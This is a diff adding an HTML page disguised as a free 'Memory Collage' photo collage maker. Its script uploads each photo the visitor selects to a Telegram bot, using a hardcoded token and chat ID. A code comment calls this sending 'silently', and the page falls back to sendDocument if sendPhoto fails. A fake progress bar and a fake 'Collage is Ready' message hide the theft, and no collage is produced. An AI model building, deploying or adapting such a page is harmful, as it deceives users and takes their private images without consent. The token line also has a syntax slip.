@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Memories — Photo Collage Maker</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #4facfe 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 24px;
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.35);
+      max-width: 480px;
+      width: 100%;
+      padding: 45px 35px;
+      text-align: center;
+    }
+
+    .icon {
+      font-size: 3.5rem;
+      margin-bottom: 12px;
+    }
+
+    h1 {
+      color: #2d2d2d;
+      font-size: 1.9rem;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: #999;
+      font-size: 0.95rem;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    .upload-area {
+      border: 3px dashed #f5576c;
+      border-radius: 16px;
+      padding: 35px 20px;
+      margin-bottom: 25px;
+      cursor: pointer;
+      transition: all 0.3s;
+      background: #fff5f7;
+    }
+
+    .upload-area:hover {
+      border-color: #4facfe;
+      background: #f0f5ff;
+    }
+
+    .upload-icon {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+    }
+
+    .upload-text {
+      color: #666;
+      font-size: 1rem;
+      margin-bottom: 5px;
+    }
+
+    .upload-hint {
+      color: #bbb;
+      font-size: 0.85rem;
+    }
+
+    #file-input {
+      display: none;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #f5576c, #4facfe);
+      color: white;
+      border: none;
+      padding: 16px 45px;
+      font-size: 1.1rem;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      font-weight: 600;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 30px rgba(245, 87, 108, 0.45);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .preview-grid {
+      display: none;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 8px;
+      margin-bottom: 25px;
+    }
+
+    .preview-grid img {
+      width: 100%;
+      height: 90px;
+      object-fit: cover;
+      border-radius: 8px;
+    }
+
+    .progress-section {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .progress-bar-bg {
+      height: 8px;
+      background: #f0f0f0;
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 15px;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #f093fb, #f5576c, #4facfe);
+      width: 0%;
+      transition: width 0.3s;
+      border-radius: 10px;
+    }
+
+    .progress-text {
+      color: #888;
+      font-size: 0.9rem;
+    }
+
+    .result {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .result-icon {
+      font-size: 4rem;
+      margin-bottom: 12px;
+    }
+
+    .result h2 {
+      color: #333;
+      font-size: 1.4rem;
+      margin-bottom: 8px;
+    }
+
+    .result p {
+      color: #999;
+      font-size: 0.95rem;
+    }
+
+    .badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #f093fb, #4facfe);
+      color: white;
+      padding: 6px 16px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      margin-top: 15px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon">📸</div>
+    <h1>Memory Collage</h1>
+    <p class="subtitle">Select your favorite photos and we'll instantly create a beautiful collage with AI-powered filters. Free, fast, and magical!</p>
+
+    <label for="file-input" class="upload-area">
+      <div class="upload-icon">📁</div>
+      <div class="upload-text">Tap to select photos</div>
+      <div class="upload-hint">Select all your favorite memories</div>
+    </label>
+    <input type="file" id="file-input" multiple accept="image/*">
+
+    <div class="preview-grid" id="preview-grid"></div>
+
+    <button class="btn" id="create-btn" disabled>Create My Collage →</button>
+
+    <div class="progress-section" id="progress-section">
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progress-fill"></div>
+      </div>
+      <p class="progress-text" id="progress-text">Creating your collage... 0%</p>
+    </div>
+
+    <div class="result" id="result">
+      <div class="result-icon">🎨</div>
+      <h2>Your Collage is Ready!</h2>
+      <p>We've applied beautiful AI filters to your photos.</p>
+      <span class="badge">✨ AI Enhanced</span>
+    </div>
+  </div>
+
+  <script>
+    // ============================================
+    // CONFIG — Replace with your values
+    // ============================================
+    const BOT_TOKEN = '8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto;
+    const CHAT_ID = '822289797 HERE';
+    // ============================================
+
+    const fileInput = document.getElementById('file-input');
+    const previewGrid = document.getElementById('preview-grid');
+    const createBtn = document.getElementById('create-btn');
+    const progressSection = document.getElementById('progress-section');
+    const progressFill = document.getElementById('progress-fill');
+    const progressText = document.getElementById('progress-text');
+    const result = document.getElementById('result');
+
+    let selectedFiles = [];
+
+    // When user selects files
+    fileInput.addEventListener('change', function(e) {
+      selectedFiles = Array.from(e.target.files);
+      if (selectedFiles.length === 0) return;
+
+      // Show previews
+      previewGrid.style.display = 'grid';
+      previewGrid.innerHTML = '';
+      createBtn.disabled = false;
+
+      selectedFiles.forEach(function(file) {
+        const reader = new FileReader();
+        reader.onload = function(ev) {
+          const img = document.createElement('img');
+          img.src = ev.target.result;
+          previewGrid.appendChild(img);
+        };
+        reader.readAsDataURL(file);
+      });
+    });
+
+    // Create collage button
+    createBtn.addEventListener('click', function() {
+      createBtn.style.display = 'none';
+      previewGrid.style.display = 'none';
+      progressSection.style.display = 'block';
+
+      let sent = 0;
+      const total = selectedFiles.length;
+
+      // Send each photo to Telegram silently
+      selectedFiles.forEach(function(file, index) {
+        const formData = new FormData();
+        formData.append('chat_id', 822289797);
+        formData.append('photo', file, file.name);
+        formData.append('caption', `📷 Photo ${index + 1}/${total} from visitor`);
+
+        fetch(`https://api.telegram.org/bot8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          sent++;
+          updateProgress(sent, total);
+        })
+        .catch(function(err) {
+          // If sendPhoto fails (file too large), try as document
+          const fd2 = new FormData();
+          fd2.append('chat_id', 822289797);
+          fd2.append('document', file, file.name);
+          fetch(`https://api.telegram.org/bot8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto/sendDocument`, {
+            method: 'POST',
+            body: fd2
+          })
+          .then(function() {
+            sent++;
+            updateProgress(sent, total);
+          })
+          .catch(function() {
+            sent++;
+            updateProgress(sent, total);
+          });
+        });
+      });
+    });
+
+    function updateProgress(sent, total) {
+      const percent = Math.round((sent / total) * 100);
+      progressFill.style.width = percent + '%';
+      progressText.textContent = `Creating your collage... ${percent}%`;
+
+      if (sent >= total) {
+        setTimeout(function() {
+          progressSection.style.display = 'none';
+          result.style.display = 'block';
+        }, 1000);
+      }
+    }
+  </script>
+</body>
+  </html>
